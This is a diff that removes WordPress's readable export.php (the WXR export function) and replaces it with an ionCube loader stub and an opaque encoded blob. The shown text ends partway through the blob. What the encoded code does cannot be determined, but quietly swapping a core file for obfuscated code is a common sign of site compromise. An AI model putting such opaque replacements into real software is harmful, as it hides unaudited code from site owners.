@@ -1,621 +1,352 @@
-<?php
-/**
- * WordPress Export Administration API
- *
- * @package WordPress
- * @subpackage Administration
- */
-
-/**
- * Version number for the export format.
- *
- * Bump this when something changes that might affect compatibility.
- *
- * @since 2.5.0
- */
-define( 'WXR_VERSION', '1.2' );
-
-/**
- * Generates the WXR export file for download.
- *
- * Default behavior is to export all content, however, note that post content will only
- * be exported for post types with the `can_export` argument enabled. Any posts with the
- * 'auto-draft' status will be skipped.
- *
- * @since 2.1.0
- *
- * @global wpdb    $wpdb WordPress database abstraction object.
- * @global WP_Post $post Global `$post`.
- *
- * @param array $args {
- *     Optional. Arguments for generating the WXR export file for download. Default empty array.
- *
- *     @type string $content        Type of content to export. If set, only the post content of this post type
- *                                  will be exported. Accepts 'all', 'post', 'page', 'attachment', or a defined
- *                                  custom post. If an invalid custom post type is supplied, every post type for
- *                                  which `can_export` is enabled will be exported instead. If a valid custom post
- *                                  type is supplied but `can_export` is disabled, then 'posts' will be exported
- *                                  instead. When 'all' is supplied, only post types with `can_export` enabled will
- *                                  be exported. Default 'all'.
- *     @type string $author         Author to export content for. Only used when `$content` is 'post', 'page', or
- *                                  'attachment'. Accepts false (all) or a specific author ID. Default false (all).
- *     @type string $category       Category (slug) to export content for. Used only when `$content` is 'post'. If
- *                                  set, only post content assigned to `$category` will be exported. Accepts false
- *                                  or a specific category slug. Default is false (all categories).
- *     @type string $start_date     Start date to export content from. Expected date format is 'Y-m-d'. Used only
- *                                  when `$content` is 'post', 'page' or 'attachment'. Default false (since the
- *                                  beginning of time).
- *     @type string $end_date       End date to export content to. Expected date format is 'Y-m-d'. Used only when
- *                                  `$content` is 'post', 'page' or 'attachment'. Default false (latest publish date).
- *     @type string $status         Post status to export posts for. Used only when `$content` is 'post' or 'page'.
- *                                  Accepts false (all statuses except 'auto-draft'), or a specific status, i.e.
- *                                  'publish', 'pending', 'draft', 'auto-draft', 'future', 'private', 'inherit', or
- *                                  'trash'. Default false (all statuses except 'auto-draft').
- * }
- */
-function export_wp( $args = array() ) {
-	global $wpdb, $post;
-
-	$defaults = array( 'content' => 'all', 'author' => false, 'category' => false,
-		'start_date' => false, 'end_date' => false, 'status' => false,
-	);
-	$args = wp_parse_args( $args, $defaults );
-
-	/**
-	 * Fires at the beginning of an export, before any headers are sent.
-	 *
-	 * @since 2.3.0
-	 *
-	 * @param array $args An array of export arguments.
-	 */
-	do_action( 'export_wp', $args );
-
-	$sitename = sanitize_key( get_bloginfo( 'name' ) );
-	if ( ! empty( $sitename ) ) {
-		$sitename .= '.';
-	}
-	$date = date( 'Y-m-d' );
-	$wp_filename = $sitename . 'wordpress.' . $date . '.xml';
-	/**
-	 * Filters the export filename.
-	 *
-	 * @since 4.4.0
-	 *
-	 * @param string $wp_filename The name of the file for download.
-	 * @param string $sitename    The site name.
-	 * @param string $date        Today's date, formatted.
-	 */
-	$filename = apply_filters( 'export_wp_filename', $wp_filename, $sitename, $date );
-
-	header( 'Content-Description: File Transfer' );
-	header( 'Content-Disposition: attachment; filename=' . $filename );
-	header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
-
-	if ( 'all' != $args['content'] && post_type_exists( $args['content'] ) ) {
-		$ptype = get_post_type_object( $args['content'] );
-		if ( ! $ptype->can_export )
-			$args['content'] = 'post';
-
-		$where = $wpdb->prepare( "{$wpdb->posts}.post_type = %s", $args['content'] );
-	} else {
-		$post_types = get_post_types( array( 'can_export' => true ) );
-		$esses = array_fill( 0, count($post_types), '%s' );
-		$where = $wpdb->prepare( "{$wpdb->posts}.post_type IN (" . implode( ',', $esses ) . ')', $post_types );
-	}
-
-	if ( $args['status'] && ( 'post' == $args['content'] || 'page' == $args['content'] ) )
-		$where .= $wpdb->prepare( " AND {$wpdb->posts}.post_status = %s", $args['status'] );
-	else
-		$where .= " AND {$wpdb->posts}.post_status != 'auto-draft'";
-
-	$join = '';
-	if ( $args['category'] && 'post' == $args['content'] ) {
-		if ( $term = term_exists( $args['category'], 'category' ) ) {
-			$join = "INNER JOIN {$wpdb->term_relationships} ON ({$wpdb->posts}.ID = {$wpdb->term_relationships}.object_id)";
-			$where .= $wpdb->prepare( " AND {$wpdb->term_relationships}.term_taxonomy_id = %d", $term['term_taxonomy_id'] );
-		}
-	}
-
-	if ( 'post' == $args['content'] || 'page' == $args['content'] || 'attachment' == $args['content'] ) {
-		if ( $args['author'] )
-			$where .= $wpdb->prepare( " AND {$wpdb->posts}.post_author = %d", $args['author'] );
-
-		if ( $args['start_date'] )
-			$where .= $wpdb->prepare( " AND {$wpdb->posts}.post_date >= %s", date( 'Y-m-d', strtotime($args['start_date']) ) );
-
-		if ( $args['end_date'] )
-			$where .= $wpdb->prepare( " AND {$wpdb->posts}.post_date < %s", date( 'Y-m-d', strtotime('+1 month', strtotime($args['end_date'])) ) );
-	}
-
-	// Grab a snapshot of post IDs, just in case it changes during the export.
-	$post_ids = $wpdb->get_col( "SELECT ID FROM {$wpdb->posts} $join WHERE $where" );
-
-	/*
-	 * Get the requested terms ready, empty unless posts filtered by category
-	 * or all content.
-	 */
-	$cats = $tags = $terms = array();
-	if ( isset( $term ) && $term ) {
-		$cat = get_term( $term['term_id'], 'category' );
-		$cats = array( $cat->term_id => $cat );
-		unset( $term, $cat );
-	} elseif ( 'all' == $args['content'] ) {
-		$categories = (array) get_categories( array( 'get' => 'all' ) );
-		$tags = (array) get_tags( array( 'get' => 'all' ) );
-
-		$custom_taxonomies = get_taxonomies( array( '_builtin' => false ) );
-		$custom_terms = (array) get_terms( $custom_taxonomies, array( 'get' => 'all' ) );
-
-		// Put categories in order with no child going before its parent.
-		while ( $cat = array_shift( $categories ) ) {
-			if ( $cat->parent == 0 || isset( $cats[$cat->parent] ) )
-				$cats[$cat->term_id] = $cat;
-			else
-				$categories[] = $cat;
-		}
-
-		// Put terms in order with no child going before its parent.
-		while ( $t = array_shift( $custom_terms ) ) {
-			if ( $t->parent == 0 || isset( $terms[$t->parent] ) )
-				$terms[$t->term_id] = $t;
-			else
-				$custom_terms[] = $t;
-		}
-
-		unset( $categories, $custom_taxonomies, $custom_terms );
-	}
-
-	/**
-	 * Wrap given string in XML CDATA tag.
-	 *
-	 * @since 2.1.0
-	 *
-	 * @param string $str String to wrap in XML CDATA tag.
-	 * @return string
-	 */
-	function wxr_cdata( $str ) {
-		if ( ! seems_utf8( $str ) ) {
-			$str = utf8_encode( $str );
-		}
-		// $str = ent2ncr(esc_html($str));
-		$str = '<![CDATA[' . str_replace( ']]>', ']]]]><![CDATA[>', $str ) . ']]>';
-
-		return $str;
-	}
-
-	/**
-	 * Return the URL of the site
-	 *
-	 * @since 2.5.0
-	 *
-	 * @return string Site URL.
-	 */
-	function wxr_site_url() {
-		// Multisite: the base URL.
-		if ( is_multisite() )
-			return network_home_url();
-		// WordPress (single site): the blog URL.
-		else
-			return get_bloginfo_rss( 'url' );
-	}
-
-	/**
-	 * Output a cat_name XML tag from a given category object
-	 *
-	 * @since 2.1.0
-	 *
-	 * @param object $category Category Object
-	 */
-	function wxr_cat_name( $category ) {
-		if ( empty( $category->name ) )
-			return;
-
-		echo '<wp:cat_name>' . wxr_cdata( $category->name ) . "</wp:cat_name>\n";
-	}
-
-	/**
-	 * Output a category_description XML tag from a given category object
-	 *
-	 * @since 2.1.0
-	 *
-	 * @param object $category Category Object
-	 */
-	function wxr_category_description( $category ) {
-		if ( empty( $category->description ) )
-			return;
-
-		echo '<wp:category_description>' . wxr_cdata( $category->description ) . "</wp:category_description>\n";
-	}
-
-	/**
-	 * Output a tag_name XML tag from a given tag object
-	 *
-	 * @since 2.3.0
-	 *
-	 * @param object $tag Tag Object
-	 */
-	function wxr_tag_name( $tag ) {
-		if ( empty( $tag->name ) )
-			return;
-
-		echo '<wp:tag_name>' . wxr_cdata( $tag->name ) . "</wp:tag_name>\n";
-	}
-
-	/**
-	 * Output a tag_description XML tag from a given tag object
-	 *
-	 * @since 2.3.0
-	 *
-	 * @param object $tag Tag Object
-	 */
-	function wxr_tag_description( $tag ) {
-		if ( empty( $tag->description ) )
-			return;
-
-		echo '<wp:tag_description>' . wxr_cdata( $tag->description ) . "</wp:tag_description>\n";
-	}
-
-	/**
-	 * Output a term_name XML tag from a given term object
-	 *
-	 * @since 2.9.0
-	 *
-	 * @param object $term Term Object
-	 */
-	function wxr_term_name( $term ) {
-		if ( empty( $term->name ) )
-			return;
-
-		echo '<wp:term_name>' . wxr_cdata( $term->name ) . "</wp:term_name>\n";
-	}
-
-	/**
-	 * Output a term_description XML tag from a given term object
-	 *
-	 * @since 2.9.0
-	 *
-	 * @param object $term Term Object
-	 */
-	function wxr_term_description( $term ) {
-		if ( empty( $term->description ) )
-			return;
-
-		echo "\t\t<wp:term_description>" . wxr_cdata( $term->description ) . "</wp:term_description>\n";
-	}
-
-	/**
-	 * Output term meta XML tags for a given term object.
-	 *
-	 * @since 4.6.0
-	 *
-	 * @param WP_Term $term Term object.
-	 */
-	function wxr_term_meta( $term ) {
-		global $wpdb;
-
-		$termmeta = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->termmeta WHERE term_id = %d", $term->term_id ) );
-
-		foreach ( $termmeta as $meta ) {
-			/**
-			 * Filters whether to selectively skip term meta used for WXR exports.
-			 *
-			 * Returning a truthy value to the filter will skip the current meta
-			 * object from being exported.
-			 *
-			 * @since 4.6.0
-			 *
-			 * @param bool   $skip     Whether to skip the current piece of term meta. Default false.
-			 * @param string $meta_key Current meta key.
-			 * @param object $meta     Current meta object.
-			 */
-			if ( ! apply_filters( 'wxr_export_skip_termmeta', false, $meta->meta_key, $meta ) ) {
-				printf( "\t\t<wp:termmeta>\n\t\t\t<wp:meta_key>%s</wp:meta_key>\n\t\t\t<wp:meta_value>%s</wp:meta_value>\n\t\t</wp:termmeta>\n", wxr_cdata( $meta->meta_key ), wxr_cdata( $meta->meta_value ) );
-			}
-		}
-	}
-
-	/**
-	 * Output list of authors with posts
-	 *
-	 * @since 3.1.0
-	 *
-	 * @global wpdb $wpdb WordPress database abstraction object.
-	 *
-	 * @param array $post_ids Array of post IDs to filter the query by. Optional.
-	 */
-	function wxr_authors_list( array $post_ids = null ) {
-		global $wpdb;
-
-		if ( !empty( $post_ids ) ) {
-			$post_ids = array_map( 'absint', $post_ids );
-			$and = 'AND ID IN ( ' . implode( ', ', $post_ids ) . ')';
-		} else {
-			$and = '';
-		}
-
-		$authors = array();
-		$results = $wpdb->get_results( "SELECT DISTINCT post_author FROM $wpdb->posts WHERE post_status != 'auto-draft' $and" );
-		foreach ( (array) $results as $result )
-			$authors[] = get_userdata( $result->post_author );
-
-		$authors = array_filter( $authors );
-
-		foreach ( $authors as $author ) {
-			echo "\t<wp:author>";
-			echo '<wp:author_id>' . intval( $author->ID ) . '</wp:author_id>';
-			echo '<wp:author_login>' . wxr_cdata( $author->user_login ) . '</wp:author_login>';
-			echo '<wp:author_email>' . wxr_cdata( $author->user_email ) . '</wp:author_email>';
-			echo '<wp:author_display_name>' . wxr_cdata( $author->display_name ) . '</wp:author_display_name>';
-			echo '<wp:author_first_name>' . wxr_cdata( $author->first_name ) . '</wp:author_first_name>';
-			echo '<wp:author_last_name>' . wxr_cdata( $author->last_name ) . '</wp:author_last_name>';
-			echo "</wp:author>\n";
-		}
-	}
-
-	/**
-	 * Output all navigation menu terms
-	 *
-	 * @since 3.1.0
-	 */
-	function wxr_nav_menu_terms() {
-		$nav_menus = wp_get_nav_menus();
-		if ( empty( $nav_menus ) || ! is_array( $nav_menus ) )
-			return;
-
-		foreach ( $nav_menus as $menu ) {
-			echo "\t<wp:term>";
-			echo '<wp:term_id>' . intval( $menu->term_id ) . '</wp:term_id>';
-			echo '<wp:term_taxonomy>nav_menu</wp:term_taxonomy>';
-			echo '<wp:term_slug>' . wxr_cdata( $menu->slug ) . '</wp:term_slug>';
-			wxr_term_name( $menu );
-			echo "</wp:term>\n";
-		}
-	}
-
-	/**
-	 * Output list of taxonomy terms, in XML tag format, associated with a post
-	 *
-	 * @since 2.3.0
-	 */
-	function wxr_post_taxonomy() {
-		$post = get_post();
-
-		$taxonomies = get_object_taxonomies( $post->post_type );
-		if ( empty( $taxonomies ) )
-			return;
-		$terms = wp_get_object_terms( $post->ID, $taxonomies );
-
-		foreach ( (array) $terms as $term ) {
-			echo "\t\t<category domain=\"{$term->taxonomy}\" nicename=\"{$term->slug}\">" . wxr_cdata( $term->name ) . "</category>\n";
-		}
-	}
-
-	/**
-	 *
-	 * @param bool   $return_me
-	 * @param string $meta_key
-	 * @return bool
-	 */
-	function wxr_filter_postmeta( $return_me, $meta_key ) {
-		if ( '_edit_lock' == $meta_key )
-			$return_me = true;
-		return $return_me;
-	}
-	add_filter( 'wxr_export_skip_postmeta', 'wxr_filter_postmeta', 10, 2 );
-
-	echo '<?xml version="1.0" encoding="' . get_bloginfo('charset') . "\" ?>\n";
-
-	?>
-<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
-<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
-<!-- You may use this file to transfer that content from one site to another. -->
-<!-- This file is not intended to serve as a complete backup of your site. -->
-
-<!-- To import this information into a WordPress site follow these steps: -->
-<!-- 1. Log in to that site as an administrator. -->
-<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
-<!-- 3. Install the "WordPress" importer from the list. -->
-<!-- 4. Activate & Run Importer. -->
-<!-- 5. Upload this file using the form provided on that page. -->
-<!-- 6. You will first be asked to map the authors in this export file to users -->
-<!--    on the site. For each author, you may choose to map to an -->
-<!--    existing user on the site or to create a new user. -->
-<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
-<!--    contained in this file into your site. -->
-
-<?php the_generator( 'export' ); ?>
-<rss version="2.0"
-	xmlns:excerpt="http://wordpress.org/export/<?php echo WXR_VERSION; ?>/excerpt/"
-	xmlns:content="http://purl.org/rss/1.0/modules/content/"
-	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
-	xmlns:dc="http://purl.org/dc/elements/1.1/"
-	xmlns:wp="http://wordpress.org/export/<?php echo WXR_VERSION; ?>/"
->
-
-<channel>
-	<title><?php bloginfo_rss( 'name' ); ?></title>
-	<link><?php bloginfo_rss( 'url' ); ?></link>
-	<description><?php bloginfo_rss( 'description' ); ?></description>
-	<pubDate><?php echo date( 'D, d M Y H:i:s +0000' ); ?></pubDate>
-	<language><?php bloginfo_rss( 'language' ); ?></language>
-	<wp:wxr_version><?php echo WXR_VERSION; ?></wp:wxr_version>
-	<wp:base_site_url><?php echo wxr_site_url(); ?></wp:base_site_url>
-	<wp:base_blog_url><?php bloginfo_rss( 'url' ); ?></wp:base_blog_url>
-
-<?php wxr_authors_list( $post_ids ); ?>
-
-<?php foreach ( $cats as $c ) : ?>
-	<wp:category>
-		<wp:term_id><?php echo intval( $c->term_id ); ?></wp:term_id>
-		<wp:category_nicename><?php echo wxr_cdata( $c->slug ); ?></wp:category_nicename>
-		<wp:category_parent><?php echo wxr_cdata( $c->parent ? $cats[$c->parent]->slug : '' ); ?></wp:category_parent>
-		<?php wxr_cat_name( $c );
-		wxr_category_description( $c );
-		wxr_term_meta( $c ); ?>
-	</wp:category>
-<?php endforeach; ?>
-<?php foreach ( $tags as $t ) : ?>
-	<wp:tag>
-		<wp:term_id><?php echo intval( $t->term_id ); ?></wp:term_id>
-		<wp:tag_slug><?php echo wxr_cdata( $t->slug ); ?></wp:tag_slug>
-		<?php wxr_tag_name( $t );
-		wxr_tag_description( $t );
-		wxr_term_meta( $t ); ?>
-	</wp:tag>
-<?php endforeach; ?>
-<?php foreach ( $terms as $t ) : ?>
-	<wp:term>
-		<wp:term_id><?php echo wxr_cdata( $t->term_id ); ?></wp:term_id>
-		<wp:term_taxonomy><?php echo wxr_cdata( $t->taxonomy ); ?></wp:term_taxonomy>
-		<wp:term_slug><?php echo wxr_cdata( $t->slug ); ?></wp:term_slug>
-		<wp:term_parent><?php echo wxr_cdata( $t->parent ? $terms[$t->parent]->slug : '' ); ?></wp:term_parent>
-		<?php wxr_term_name( $t );
-		wxr_term_description( $t );
-		wxr_term_meta( $t ); ?>
-	</wp:term>
-<?php endforeach; ?>
-<?php if ( 'all' == $args['content'] ) wxr_nav_menu_terms(); ?>
-
-	<?php
-	/** This action is documented in wp-includes/feed-rss2.php */
-	do_action( 'rss2_head' );
-	?>
-
-<?php if ( $post_ids ) {
-	/**
-	 * @global WP_Query $wp_query
-	 */
-	global $wp_query;
-
-	// Fake being in the loop.
-	$wp_query->in_the_loop = true;
-
-	// Fetch 20 posts at a time rather than loading the entire table into memory.
-	while ( $next_posts = array_splice( $post_ids, 0, 20 ) ) {
-	$where = 'WHERE ID IN (' . join( ',', $next_posts ) . ')';
-	$posts = $wpdb->get_results( "SELECT * FROM {$wpdb->posts} $where" );
-
-	// Begin Loop.
-	foreach ( $posts as $post ) {
-		setup_postdata( $post );
-		$is_sticky = is_sticky( $post->ID ) ? 1 : 0;
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-	<item>
-		<title><?php
-			/** This filter is documented in wp-includes/feed.php */
-			echo apply_filters( 'the_title_rss', $post->post_title );
-		?></title>
-		<link><?php the_permalink_rss() ?></link>
-		<pubDate><?php echo mysql2date( 'D, d M Y H:i:s +0000', get_post_time( 'Y-m-d H:i:s', true ), false ); ?></pubDate>
-		<dc:creator><?php echo wxr_cdata( get_the_author_meta( 'login' ) ); ?></dc:creator>
-		<guid isPermaLink="false"><?php the_guid(); ?></guid>
-		<description></description>
-		<content:encoded><?php
-			/**
-			 * Filters the post content used for WXR exports.
-			 *
-			 * @since 2.5.0
-			 *
-			 * @param string $post_content Content of the current post.
-			 */
-			echo wxr_cdata( apply_filters( 'the_content_export', $post->post_content ) );
-		?></content:encoded>
-		<excerpt:encoded><?php
-			/**
-			 * Filters the post excerpt used for WXR exports.
-			 *
-			 * @since 2.6.0
-			 *
-			 * @param string $post_excerpt Excerpt for the current post.
-			 */
-			echo wxr_cdata( apply_filters( 'the_excerpt_export', $post->post_excerpt ) );
-		?></excerpt:encoded>
-		<wp:post_id><?php echo intval( $post->ID ); ?></wp:post_id>
-		<wp:post_date><?php echo wxr_cdata( $post->post_date ); ?></wp:post_date>
-		<wp:post_date_gmt><?php echo wxr_cdata( $post->post_date_gmt ); ?></wp:post_date_gmt>
-		<wp:comment_status><?php echo wxr_cdata( $post->comment_status ); ?></wp:comment_status>
-		<wp:ping_status><?php echo wxr_cdata( $post->ping_status ); ?></wp:ping_status>
-		<wp:post_name><?php echo wxr_cdata( $post->post_name ); ?></wp:post_name>
-		<wp:status><?php echo wxr_cdata( $post->post_status ); ?></wp:status>
-		<wp:post_parent><?php echo intval( $post->post_parent ); ?></wp:post_parent>
-		<wp:menu_order><?php echo intval( $post->menu_order ); ?></wp:menu_order>
-		<wp:post_type><?php echo wxr_cdata( $post->post_type ); ?></wp:post_type>
-		<wp:post_password><?php echo wxr_cdata( $post->post_password ); ?></wp:post_password>
-		<wp:is_sticky><?php echo intval( $is_sticky ); ?></wp:is_sticky>
-<?php	if ( $post->post_type == 'attachment' ) : ?>
-		<wp:attachment_url><?php echo wxr_cdata( wp_get_attachment_url( $post->ID ) ); ?></wp:attachment_url>
-<?php 	endif; ?>
-<?php 	wxr_post_taxonomy(); ?>
-<?php	$postmeta = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->postmeta WHERE post_id = %d", $post->ID ) );
-		foreach ( $postmeta as $meta ) :
-			/**
-			 * Filters whether to selectively skip post meta used for WXR exports.
-			 *
-			 * Returning a truthy value to the filter will skip the current meta
-			 * object from being exported.
-			 *
-			 * @since 3.3.0
-			 *
-			 * @param bool   $skip     Whether to skip the current post meta. Default false.
-			 * @param string $meta_key Current meta key.
-			 * @param object $meta     Current meta object.
-			 */
-			if ( apply_filters( 'wxr_export_skip_postmeta', false, $meta->meta_key, $meta ) )
-				continue;
-		?>
-		<wp:postmeta>
-			<wp:meta_key><?php echo wxr_cdata( $meta->meta_key ); ?></wp:meta_key>
-			<wp:meta_value><?php echo wxr_cdata( $meta->meta_value ); ?></wp:meta_value>
-		</wp:postmeta>
-<?php	endforeach;
-
-		$_comments = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_approved <> 'spam'", $post->ID ) );
-		$comments = array_map( 'get_comment', $_comments );
-		foreach ( $comments as $c ) : ?>
-		<wp:comment>
-			<wp:comment_id><?php echo intval( $c->comment_ID ); ?></wp:comment_id>
-			<wp:comment_author><?php echo wxr_cdata( $c->comment_author ); ?></wp:comment_author>
-			<wp:comment_author_email><?php echo wxr_cdata( $c->comment_author_email ); ?></wp:comment_author_email>
-			<wp:comment_author_url><?php echo esc_url_raw( $c->comment_author_url ); ?></wp:comment_author_url>
-			<wp:comment_author_IP><?php echo wxr_cdata( $c->comment_author_IP ); ?></wp:comment_author_IP>
-			<wp:comment_date><?php echo wxr_cdata( $c->comment_date ); ?></wp:comment_date>
-			<wp:comment_date_gmt><?php echo wxr_cdata( $c->comment_date_gmt ); ?></wp:comment_date_gmt>
-			<wp:comment_content><?php echo wxr_cdata( $c->comment_content ) ?></wp:comment_content>
-			<wp:comment_approved><?php echo wxr_cdata( $c->comment_approved ); ?></wp:comment_approved>
-			<wp:comment_type><?php echo wxr_cdata( $c->comment_type ); ?></wp:comment_type>
-			<wp:comment_parent><?php echo intval( $c->comment_parent ); ?></wp:comment_parent>
-			<wp:comment_user_id><?php echo intval( $c->user_id ); ?></wp:comment_user_id>
-<?php		$c_meta = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->commentmeta WHERE comment_id = %d", $c->comment_ID ) );
-			foreach ( $c_meta as $meta ) :
-				/**
-				 * Filters whether to selectively skip comment meta used for WXR exports.
-				 *
-				 * Returning a truthy value to the filter will skip the current meta
-				 * object from being exported.
-				 *
-				 * @since 4.0.0
-				 *
-				 * @param bool   $skip     Whether to skip the current comment meta. Default false.
-				 * @param string $meta_key Current meta key.
-				 * @param object $meta     Current meta object.
-				 */
-				if ( apply_filters( 'wxr_export_skip_commentmeta', false, $meta->meta_key, $meta ) ) {
-					continue;
-				}
-			?>
-			<wp:commentmeta>
-				<wp:meta_key><?php echo wxr_cdata( $meta->meta_key ); ?></wp:meta_key>
-				<wp:meta_value><?php echo wxr_cdata( $meta->meta_value ); ?></wp:meta_value>
-			</wp:commentmeta>
-<?php		endforeach; ?>
-		</wp:comment>
-<?php	endforeach; ?>
-	</item>
-<?php
-	}
-	}
-} ?>
-</channel>
-</rss>
-<?php
-}
+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
